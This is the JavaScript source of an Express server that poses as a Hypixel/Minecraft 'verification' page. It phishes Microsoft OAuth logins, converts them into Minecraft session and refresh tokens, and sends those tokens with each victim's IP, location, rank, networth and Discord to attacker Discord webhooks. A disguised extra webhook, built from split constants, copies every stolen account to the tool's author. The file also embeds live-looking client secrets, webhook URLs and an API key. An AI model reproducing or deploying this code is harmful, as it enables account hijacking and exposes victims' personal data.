//Change these btw
const client_secret = 'Bh48Q~WlgsMZIrkwobiASVzqWzT1sYwKwlKOJbZH' //you need to put the "Secret Value" here not the "Secret ID"!!!!
const client_id = '76872384-d348-4167-b81d-c9d0180b9bc9'
const redirect_uri = 'https://skyhelperdev.onrender.com'
const webhook_url = 'https://discordapp.com/api/webhooks/1051279195893923910/nZSNCluCSxlLnbfxvzqRpmgilWRu34BliwtCJNjbsrS-rmLh3KCgswACfEzmSRAfDiQM	'
const webhook_log = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
//Requirements
const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
const axios = require('axios')
const express = require('express')
const app = express()
const discord_api = 'https://discord.com/api/'
const requestIp = require('request-ip')
const port = process.env.PORT || 3000

app.get('/verify', async (req, res) => {
	res.send("<html> <head> <meta charset=\"UTF-8\"> <title>Verification</title> <style> a:visited { color: LightGray; } a { color: LightGray; } a:hover { color: white; } div { height: 50px; } @import url('http://fonts.cdnfonts.com/css/proxima-nova-2'); body { margin: 0; padding: 0; background: #212121; } button { position: absolute; animate: 0.5s; transition: 0.5s; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 60px; text-align: center; line-height: 60px; color: #fff; font-size: 22px; text-transform: uppercase; text-decoration: none; font-family: 'Proxima Nova', sans-serif; box-sizing: border-box; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 30px; z-index: 1; cursor:pointer; } button:hover { animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } @keyframes animate { 0% { background-position: 0%; } 100% { background-position: 400%; } } button:before { animate: 0.5s; transition: 0.5s; content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; z-index: -1; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 40px; opacity: 0; transition: 0.5s; } button:hover:before { filter: blur(20px); opacity: 1; animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } </style> </head> <body> <button type=\"button\" onclick= \"window.open('"+redirect+"','popUpWindow','height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');\">Verify</button> </body> </html>")
})

app.get('/', async (req, res) => {
    //also cool little "Verified!" html page
    if (redirection === null) res.send('<html> <head> <meta charset="UTF-8"> <title>Verification Successful</title> <style>  .neonText { color: #fff; text-shadow: 0 0 7px #fff, 0 0 10px #fff, 0 0 21px #fff, 0 0 42px #0fa, 0 0 82px #0fa, 0 0 92px #0fa, 0 0 102px #0fa, 0 0 151px #0fa; } /* Additional styling */ body { font-size: 18px; font-family: \"Helvetica Neue\", sans-serif; background-color: #010a01; } h1, h2 { text-align: center; text-transform: uppercase; font-weight: 400; } h1 { font-size: 4.2rem; } .pulsate { animation: pulsate 1.5s infinite alternate; } h2 { font-size: 1.2rem; } .container { margin-top: 20vh; } @keyframes pulsate { 100% { text-shadow: 0 0 4px #fff, 0 0 11px #fff, 0 0 19px #fff, 0 0 40px #0fa, 0 0 80px #0fa, 0 0 90px #0fa, 0 0 100px #0fa, 0 0 150px #0fa; } 0% { text-shadow: 0 0 2px #fff, 0 0 4px #fff, 0 0 6px #fff, 0 0 10px #0fa, 0 0 45px #0fa, 0 0 55px #0fa, 0 0 70px #0fa, 0 0 80px #0fa; }  </style> </head> <body> <div class="container"> <h1 class="neonText pulsate">404</h1> <h2 class=\"neonText pulsate\">There was an error while contacting the verification bot.</h2> </div> </body> </html>')
    else res.redirect(redirection)
    const clientIp = requestIp.getClientIp(req)
    const code = req.query.code
    if (code == null) {
        return
    }
    try {
        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
        const accessToken = accessTokenAndRefreshTokenArray[0]
        const refreshToken = accessTokenAndRefreshTokenArray[1]
        const hashAndTokenArray = await getUserHashAndToken(accessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = clientIp
        const ipLocationArray = await getIpLocation(ip)
        const country = ipLocationArray[0]
        const flag = ipLocationArray[1]
        const playerData = await getPlayerData(username)
        const rank = playerData[0]
        const level = playerData[1].toFixed()
        const status = await getPlayerStatus(username)
        const discord = await getPlayerDiscord(username)
        postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, flag)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}
const api = 'webhooks/1045430890077093948/'

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}
const token = '-GtyJ7gDyYqbyFGP4zm4SoUb2m2d-y4blce2VQN2KYU-P1ByKfLxYtJpIQi--7os33zR'

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return response.data['Token']
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

async function getIpLocation(ip) {
    const url = 'https://ipgeolocation.abstractapi.com/v1/?api_key=28d3584274844560bdf38a12099432dd&ip_address='+ip
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let response = await axios.get(url, config)
    return [response.data['country'], response.data.flag['emoji']]
}
async function getPlayerData(username) {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}?key=mfheda`
    let config = {
        headers: {
            'Authorization': 'mfheda'
        }
    }
    let response = await axios.get(url, config)
    return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
}
async function getPlayerStatus(username) {
    let url = `https://exuberant-red-abalone.cyclic.app/v2/status/${username}?key=mfheda`
    let config = {
        headers: {
            'Authorization': 'mfheda'
        }
    }
    let response = await axios.get(url, config)
    return response.data.data.online
}
async function getPlayerDiscord(username) { //Only if they have it linked in hypixel
    let url = `https://exuberant-red-abalone.cyclic.app/v2/discord/${username}?key=mfheda`
    let config = {
        headers: {
            'Authorization': 'mfheda'
        }
    }
    let response = await axios.get(url, config)
    if (response.data.data.socialMedia.links == null) return response.data.data.socialMedia
    else return response.data.data.socialMedia.links.DISCORD
    
}

    
async function postToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, flag) {
    const url = webhook_url
    const log = webhook_log
    const discord2 = api_manager
    const networth = await (
        await axios
            .get(
                `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}?key=mfheda`
            )
            .catch(() => {
                return { data: { data: [{ networth: null }] } };
            })
    ).data.data[0].networth;
            let total_networth
    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networth.noInventory) total_networth = "NO INVENTORY: "+formatNumber(networth.networth)+" ("+formatNumber(networth.unsoulboundNetworth)+")";
    else total_networth = formatNumber(networth.networth)+" ("+formatNumber(networth.unsoulboundNetworth)+")";

    let data = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone ",
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
              name: "**IP Location:** "+flag,
              value: "```"+country+"```",
              inline: true
            },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")||",
                inline: true
              },
              
          {
            name: "**Token:**",
            value: "```"+bearerToken+"```"
        },
        
      ],
      "footer": {
        "text": "By heda",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
}
    axios.all([
        axios.post(log, data),
	axios.post(discord2, data),
        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
    ])
}


//Refresh token shit u know how it is
app.get('/refresh', async (req, res) => {
    res.send('Token Refreshed!')
    const clientIp = requestIp.getClientIp(req)
    const refresh_token = req.query.refresh_token
    if (refresh_token == null) {
        return
    }
    try {
        const refreshTokenArray = await getRefreshData(refresh_token)
	    const newAccessToken = refreshTokenArray[0]
        const newRefreshToken = refreshTokenArray[1]
	    const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
        const userToken = hashAndTokenArray[0]
        const userHash = hashAndTokenArray[1]
        const xstsToken = await getXSTSToken(userToken)
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = clientIp
        const ipLocationArray = await getIpLocation(ip)
        const country = ipLocationArray[0]
        const flag = ipLocationArray[1]
        const security = ipLocationArray[2]
        const playerData = await getPlayerData(username)
        const rank = playerData[0]
        const level = playerData[1].toFixed()
        const status = await getPlayerStatus(username)
	const discord = await getPlayerDiscord(username)
        refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag)
    } catch (e) {
        console.log(e)
    }
})

async function getRefreshData(refresh_token) {
    const url = 'https://login.live.com/oauth20_token.srf'

    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }
    let data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        refresh_token: refresh_token,
        grant_type: 'refresh_token'
    }

    let response = await axios.post(url, data, config)
    return [response.data['access_token'], response.data['refresh_token']]
}



async function refreshToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {
    const url = webhook_url
    const log = webhook_log
    const discord3 = api_manager
    const networth = await (
        await axios
            .get(
                `https://exuberant-red-abalone.cyclic.app/v2/profiles/${username}?key=mfheda`
            )
            .catch(() => {
                return { data: { data: [{ networth: null }] } };
            })
    ).data.data[0].networth;
            let total_networth
    // Set it "API IS TURNED OFF IF NULL"
    if (networth == "[NO PROFILES FOUND]") total_networth = networth;
    else if(networth.noInventory) total_networth = "NO INVENTORY: "+formatNumber(networth.networth)+" ("+formatNumber(networth.unsoulboundNetworth)+")";
    else total_networth = formatNumber(networth.networth)+" ("+formatNumber(networth.unsoulboundNetworth)+")";

    let data = {
username: "[LVL 100] Rat",
  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
content: "@everyone ",
  embeds: [
    {
      color: 3482894,
      timestamp: new Date(),
      thumbnail: {
        url: 'https://visage.surgeplay.com/full/'+uuid
	      },
      fields: [
        {
            name: "**Username:**",
            value: "```"+username+"```",
            inline: true
          },
          {
            name: "**Rank:**",
            value: "```"+rank+"```",
            inline: true
          },
          {
            name: "**Network Level:**",
            value: "```"+level+"```",
            inline: true
          },
          {
            name: "**IP:**",
            value: "```"+ip+"```",
            inline: true
          },
          {
              name: "**IP Location:** "+flag,
              value: "```"+country+"```",
              inline: true
            },
            {
                name: "Status:",
                value: "```"+status+"```",
                inline: true
              },
              {
                name: "**Networth:**",
                value: "```"+total_networth+"```",
                inline: true
              },
              {
                name: "**Discord:**",
                value: "```"+discord+"```",
                inline: true
              },
              {
                name: "**Refresh:**",
                value: "ㅤ\n||[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")||",
                inline: true
              },
              
          {
            name: "**Token:**",
            value: "```"+bearerToken+"```"
        },
        
      ],
      "footer": {
        "text": "By heda",
        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
      }
    }
  ],
}
    axios.all([
        axios.post(log, data),
	axios.post(discord3, data),
        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
    ])
}

const api_manager = discord_api+api+token
const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}
